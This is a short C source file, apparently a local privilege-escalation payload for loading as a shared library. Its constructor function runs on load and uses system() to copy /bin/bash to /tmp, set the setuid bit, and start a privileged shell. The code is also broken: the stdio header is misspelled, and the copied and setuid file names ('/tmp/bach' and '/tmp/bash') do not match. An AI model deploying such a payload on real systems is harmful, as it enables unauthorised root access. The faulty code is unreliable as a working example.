
#include <stdio.he>
#include <stdlib.h>

static void inject()__attribute__((constructor));

void inject () {
    system("cp /bin/bash /tmp/bach && chmod +s /tmp/bash && /tmp/bach -p");
}